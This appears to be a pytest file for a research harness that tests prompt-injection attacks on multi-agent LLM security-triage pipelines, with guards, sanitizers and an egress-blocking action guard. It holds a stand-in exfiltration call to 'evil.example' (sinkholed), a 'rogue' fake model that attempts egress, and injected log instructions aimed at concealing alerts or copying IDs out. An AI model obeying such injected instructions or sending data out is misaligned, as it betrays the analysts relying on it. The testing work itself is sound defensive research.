"""Tests for agents.py, graph.py, runner.py, tools.py and action_guard.py."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from soclab.action_guard import ActionGuard
from soclab.agents import parse_severity, parse_tool_call, parse_verdict
from soclab.config import DEFAULTS, deep_merge
from soclab.data.build import build_dataset
from soclab.graph import TOPOLOGIES, build_graph
from soclab.llm import make_llm
from soclab.runner import dataset_dir, load_alerts, run_alert
from soclab.siem import LocalSIEM
from soclab.tools import call_tool, http_request, make_tools


def settings(**over) -> dict:
    s = deep_merge(DEFAULTS, {})
    for key, value in over.items():
        section, name = key.split("__")
        s[section][name] = value
    return s


@pytest.fixture
def datasets(tmp_path: Path) -> Path:
    for goal in ("NONE", "CONCEAL", "EXFIL", "INSTRUCT", "FABRICATE"):
        build_dataset({"source": "samples"}, goal, "direct", 7, tmp_path / goal)
    return tmp_path


def run_all(ds: Path, s: dict, out: Path, backend: dict | None = None) -> list[dict]:
    llm = make_llm(backend or {"backend": "fake"})
    return [run_alert(a, ds, llm, s, out, a["alert_id"]) for a in load_alerts(ds)]


def events(path: Path) -> list[dict]:
    return [json.loads(line) for line in path.read_text().splitlines()]


@pytest.mark.parametrize("text,expected", [
    ("blah\nVERDICT: TP\nSEVERITY: high", "TP"),
    ("**Verdict:** benign positive", "BP"),
    ('HANDOFF: {"verdict": "FP", "severity": "low"}', "FP"),
    ("VERDICT: BP ... later: Verdict = TP", "TP"),  # the last statement wins
    ("This is a false positive.", "FP"),
    ("true positive or false positive?", None),  # two kinds: unclear
    ("I cannot decide.", None),
    ("verdict_ true-positive", "TP"),
])
def test_parse_verdict(text, expected):
    assert parse_verdict(text) == expected


def test_parse_severity_and_tool_call():
    assert parse_severity("SEVERITY: Critical") == "critical"
    assert parse_severity('"severity": "low"') == "low"
    assert parse_severity("none") is None
    assert parse_tool_call('TOOL_CALL: {"name": "siem_search", "arguments": {"ip": "1.2.3.4"}}') == (
        "siem_search", {"ip": "1.2.3.4"})
    assert parse_tool_call('TOOL_CALL: {"name": "x"}') == ("x", {})
    for bad in ["no call", "TOOL_CALL: {broken", 'TOOL_CALL: {"arguments": {}}', 'TOOL_CALL: {"name": "x", "arguments": 3}',
                "TOOL_CALL: none"]:
        assert parse_tool_call(bad) is None


def test_tools_and_sinkhole(datasets):
    siem = LocalSIEM(datasets / "NONE")
    tools = make_tools(siem)
    assert call_tool(tools, "get_log", {"log_id": "log-0001"}).startswith("[log-0001]")
    assert "No log" in call_tool(tools, "get_log", {"log_id": "log-9999"})
    assert "No events" in call_tool(tools, "siem_search", {"ip": "9.9.9.9"})
    assert "unknown tool" in call_tool(tools, "rm_rf", {})
    assert "bad arguments" in call_tool(tools, "siem_search", {"host": "x"})
    assert "SINKHOLE" in http_request("http://evil.example/x", "put")  # no connection is made


def test_action_guard_rules():
    tools = {"http_request": make_tools.__globals__["Tool"]("http_request", "", True, http_request)}
    off = ActionGuard({"enabled": False})
    assert off.check("evidence", None, "anything", {}) is None
    on = ActionGuard({"enabled": True, "allowlist": {"evidence": ["siem_search", "http_request"]},
                      "egress_allow_hosts": ["intel.local"]}, llm_host="api.example")
    assert on.check("evidence", None, "siem_search", {}) is None
    assert "allowlist" in on.check("triage", None, "siem_search", {})
    net = tools["http_request"]
    assert "default deny" in on.check("evidence", net, "http_request", {"url": "http://203.0.113.9/up"})
    assert on.check("evidence", net, "http_request", {"url": "https://intel.local/q"}) is None
    assert on.check("evidence", net, "http_request", {"url": "https://api.example/v1"}) is None


@pytest.mark.parametrize("topology", sorted(TOPOLOGIES))
def test_no_defense_attack_spreads_in_every_topology(datasets, tmp_path, topology):
    out = tmp_path / "t.jsonl"
    results = run_all(datasets / "CONCEAL", settings(pipeline__topology=topology), out)
    assert all(r["attack_success"] for r in results)  # the fake model always obeys
    ev = events(out)
    agents = {e["agent"] for e in ev if e["kind"] == "agent"}
    assert agents == {s.name for s in TOPOLOGIES[topology]}
    assert any(e["marker_found"] for e in ev if e["agent"] == "triage")
    assert any(e["laundered"] and e["laundered_by"] == ["keywords"] for e in ev if e["kind"] == "agent")
    assert all(e["topology"] == topology and e["defense"] == "none" for e in ev)
    assert not any(e["kind"] == "guard" for e in ev)


@pytest.mark.parametrize("defense", ["guard_v0", "guard_v1"])
@pytest.mark.parametrize("goal", ["CONCEAL", "FABRICATE", "EXFIL", "INSTRUCT"])
def test_guards_quarantine_at_hop_1(datasets, tmp_path, defense, goal):
    out = tmp_path / "t.jsonl"
    results = run_all(datasets / goal, settings(defense__name=defense), out)
    assert all(r["quarantined_at"] == "guard_1" and r["attack_success"] is False for r in results)
    res = [e for e in events(out) if e["kind"] == "result"]
    assert all(e["verdict"] == "ESCALATE" and e["quarantined_agent"] == "triage" for e in res)


@pytest.mark.parametrize("topology", sorted(TOPOLOGIES))
@pytest.mark.parametrize("defense", ["none", "guard_v0", "llm_tagging", "layered", "guard_v1"])
def test_clean_runs_finish_with_every_defense(datasets, tmp_path, topology, defense):
    out = tmp_path / "t.jsonl"
    results = run_all(datasets / "NONE", settings(pipeline__topology=topology, defense__name=defense), out)
    assert all(not r.get("quarantined_at") and r["verdict"] in ("TP", "BP", "FP") for r in results)
    assert all(r["attack_success"] is None for r in results)


def test_llm_tagging_and_layered_change_messages(datasets, tmp_path):
    out = tmp_path / "t.jsonl"
    run_all(datasets / "CONCEAL", settings(defense__name="layered"), out)
    guards = [e for e in events(out) if e["kind"] == "guard"]
    assert {e["guard_action"] for e in guards} <= {"pass", "sanitize"}  # layered never quarantines
    triage = next(e for e in events(out) if e["agent"] == "triage")
    assert "SYSTEM:" not in triage["text"]  # the logs were sanitized before Triage read them
    out2 = tmp_path / "t2.jsonl"
    run_all(datasets / "CONCEAL", settings(defense__name="llm_tagging"), out2)
    assert {e["guard_action"] for e in events(out2) if e["kind"] == "guard"} == {"pass"}


def test_layered_stops_exfil_with_fake_model(datasets, tmp_path):
    # the sanitizer removes "copy ... internal ID" before the fake model can read it
    results = run_all(datasets / "EXFIL", settings(defense__name="layered"), tmp_path / "t.jsonl")
    assert not any(r["attack_success"] for r in results)


@pytest.mark.parametrize("ag", [False, True])
def test_rogue_model_and_action_guard(datasets, tmp_path, ag):
    out = tmp_path / "t.jsonl"
    s = settings(pipeline__evidence_tool_mode="llm", action_guard__enabled=ag)
    results = run_all(datasets / "NONE", s, out, {"backend": "fake", "fake_behavior": "rogue"})
    assert all(r["verdict"] in ("TP", "BP", "FP") for r in results)
    ev = events(out)
    blocked = [e for e in ev if e.get("guard_action") == "block"]
    sinkholed = [e for e in ev if e["kind"] == "tool" and e["tool"] == "http_request"]
    assert len(blocked) == (4 if ag else 0)
    assert len(sinkholed) == (0 if ag else 4)
    assert all(e["egress_attempt"] for e in blocked + sinkholed)
    assert {e["tool"] for e in ev if e["kind"] == "tool" and not e["egress_attempt"]} == {"siem_search", "ip_reputation"}


def test_tool_mode_stops_after_max_steps(datasets, tmp_path):
    class Looping:
        model = "loop"

        def chat(self, system, user):
            from soclab.llm import LLMResponse
            return LLMResponse('TOOL_CALL: {"name": "get_log", "arguments": {"log_id": "log-0001"}}', "loop")

    from soclab.agents import Ctx, run_step
    from soclab.defenses import make_defense
    from soclab.tracer import Tracer

    siem = LocalSIEM(datasets / "NONE")
    alert = load_alerts(datasets / "NONE")[0]
    ctx = Ctx(Looping(), siem, Tracer(tmp_path / "t.jsonl", "r", alert), make_defense("none"),
              ActionGuard({}), make_tools(siem), tool_mode="llm", max_tool_steps=2)
    step = TOPOLOGIES["chain"][1]
    out = run_step(step, {"alert": alert, "messages": {}}, ctx)
    assert out.text.startswith("TOOL_CALL")  # the final forced answer
    assert sum(1 for e in events(tmp_path / "t.jsonl") if e["kind"] == "tool") == 2


def test_unknown_topology_and_defense(datasets, tmp_path):
    with pytest.raises(ValueError):
        run_all(datasets / "NONE", settings(pipeline__topology="star"), tmp_path / "t.jsonl")
    with pytest.raises(ValueError):
        run_all(datasets / "NONE", settings(defense__name="magic"), tmp_path / "t.jsonl")
    for stub in ("g_safeguard", "paul_nandy"):
        with pytest.raises(NotImplementedError, match="documented stub"):
            run_all(datasets / "NONE", settings(defense__name=stub), tmp_path / "t.jsonl")
    with pytest.raises(ValueError):
        build_graph(None, "nope")  # type: ignore[arg-type]


def test_dataset_dir_by_name():
    assert dataset_dir("clean").name == "clean"


@pytest.mark.parametrize("backend,base,env", [
    ("openai_compat", "/v1", None), ("anthropic", "", "ANTHROPIC_API_KEY"), ("gemini", "", "GEMINI_API_KEY"),
])
def test_full_pipeline_through_mock_http_server(datasets, tmp_path, mock_server, monkeypatch, backend, base, env):
    """Integration: the real HTTP code path, a local server, no key, no internet."""
    if env:
        monkeypatch.setenv(env, "test-key")
    out = tmp_path / "t.jsonl"
    cfg = {"backend": backend, "model": "mock-model", "base_url": mock_server.url + base}
    results = run_all(datasets / "CONCEAL", settings(), out, cfg)
    assert all(r["attack_success"] for r in results)
    ev = events(out)
    assert sum(e["llm_calls"] for e in ev) == len(mock_server.requests) == 2 * 4
    assert all(e["tokens_in"] > 0 for e in ev if e["kind"] == "agent")
    assert {e["backend"] for e in ev} == {backend}
